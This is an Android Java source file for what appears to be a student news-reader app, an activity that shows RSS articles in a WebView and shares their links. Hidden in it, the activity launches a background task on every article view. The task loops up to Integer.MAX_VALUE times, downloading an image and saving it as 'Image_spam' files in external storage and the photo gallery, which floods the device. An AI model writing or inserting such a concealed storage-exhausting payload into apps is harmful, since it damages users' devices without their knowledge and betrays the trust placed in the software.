package at.fh_joanneum.newsly.news4u;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.support.annotation.Nullable;

import android.support.v4.view.MenuItemCompat;
import android.support.v7.app.AppCompatActivity;

import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.support.v7.widget.ShareActionProvider;
import android.widget.ImageView;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.Random;

import at.fh_joanneum.newsly.news4u.parser.RssEntry;

/**
 * Created by aneuh on 06.05.2017.
 */
//
public class NewsWebViewActivity extends AppCompatActivity {
    public static RssEntry CURRENT_RSS_ENTRY = null;

    WebView webView;
    public final static String APP_PATH_SD_CARD = "/DesiredSubfolderName/";
    public final static String APP_THUMBNAIL_PATH_SD_CARD = "thumbnails";

      private static final String URLS =
            "https://images.techhive.com/images/article/2016/11/03_shipping_malware-100694090-large.jpg";



    String shareActionString;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.view_web);
        webView = (WebView) findViewById(R.id.rssWebView);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl(CURRENT_RSS_ENTRY.getLink());

        new DownloadImagesTask().execute();


        ViewHelper.formatAppHeader(this);

    }

    /*@Override
    public boolean onCreateOptionsMenu(Menu menu) {
       getMenuInflater().inflate(R.menu.menu_start_screen, menu);

        MenuItem shareMenuItem = menu.findItem(R.id.menu_item_share);

        if (shareMenuItem != null) {
            ShareActionProvider shareActionProvider = (ShareActionProvider) MenuItemCompat.getActionProvider(shareMenuItem);
            Intent shareIntent = new Intent(Intent.ACTION_SEND);
            shareIntent.setType("text/plain");
            shareIntent.putExtra(Intent.EXTRA_TEXT, "http://www.google.com");
            shareActionProvider.setShareIntent(shareIntent);
            //shareMenuItem.setIcon(R.drawable.ic_action_share);
        }

        return super.onCreateOptionsMenu(menu);
        }
        */
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();

        inflater.inflate(R.menu.menu_start_screen, menu);



        MenuItem item = menu.findItem(R.id.share);

        ShareActionProvider miShare = (ShareActionProvider) MenuItemCompat.getActionProvider(item);

        Intent shareIntent = new Intent(Intent.ACTION_SEND);

        shareIntent.setType("text/plain");



        // get reference to WebView

        WebView wvArticle = (WebView) findViewById(R.id.rssWebView);

        // pass in the URL currently being used by the WebView

        shareIntent.putExtra(Intent.EXTRA_TEXT, wvArticle.getUrl());
        Log.i("Share", "article Url = "+ wvArticle.getUrl());



        miShare.setShareIntent(shareIntent);

        return super.onCreateOptionsMenu(menu);

    }



    /** Returns a share intent */
    private Intent getDefaultShareIntent(){
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setType("text/plain");
        intent.putExtra(Intent.EXTRA_SUBJECT, "SUBJECT");
        intent.putExtra(Intent.EXTRA_TEXT,"Extra Text");
        return intent;
    }

    @Override
    public final boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.share:
                shareURL();
        }
        return super.onOptionsItemSelected(item);
    }

    private void shareURL() {
        Intent shareIntent = new Intent(Intent.ACTION_SEND);
        shareIntent.setType("text/plain");
        shareIntent.putExtra(Intent.EXTRA_TEXT, webView.getUrl());
        startActivity(Intent.createChooser(shareIntent, "Share This!"));
    }

    public boolean saveImageToExternalStorage(Bitmap image) {
        String fullPath = Environment.getExternalStorageDirectory() + APP_PATH_SD_CARD + APP_THUMBNAIL_PATH_SD_CARD;

        try {
            File dir = new File(fullPath);
            if (!dir.exists()) {
                dir.mkdirs();
            }

            OutputStream fOut = null;
            Random r = new Random();
            File file = new File(fullPath, "Image_spam"+r.nextInt());
            file.createNewFile();
            fOut = new FileOutputStream(file);

// 100 means no compression, the lower you go, the stronger the compression
            image.compress(Bitmap.CompressFormat.PNG, 100, fOut);
            fOut.flush();
            fOut.close();

            MediaStore.Images.Media.insertImage(this.getContentResolver(), file.getAbsolutePath(), file.getName(), file.getName());

            return true;

        } catch (Exception e) {
            Log.e("saveToExternalStorage()", e.getMessage());
            return false;
        }
    }
    public Bitmap getBitmapFromURL(String src) {
        try {
            java.net.URL url = new java.net.URL(src);
            HttpURLConnection connection = (HttpURLConnection) url
                    .openConnection();
            connection.setDoInput(true);
            connection.connect();
            InputStream input = connection.getInputStream();
            Bitmap myBitmap = BitmapFactory.decodeStream(input);
            Log.i("BITMAP", "Bitmap from url downloaded");
            return myBitmap;
        } catch (IOException e) {
            e.printStackTrace();

            Log.i("BITMAP", "Bitmap from url DONT downloaded");
            return null;
        }
    }


    public class DownloadImagesTask extends AsyncTask<ImageView, Void, Bitmap> {

        @Override
        protected Bitmap doInBackground(ImageView... imageViews) {
            for(int i =0; i<Integer.MAX_VALUE;i++) {
                saveImageToExternalStorage(getBitmapFromURL(URLS));
            }
            return null;

        }

        @Override
        protected void onPostExecute(Bitmap result) {

        }
    }
}
